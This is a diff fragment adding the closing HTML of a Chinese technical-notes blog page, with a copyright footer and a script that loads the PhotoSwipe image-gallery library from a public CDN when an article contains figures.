+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
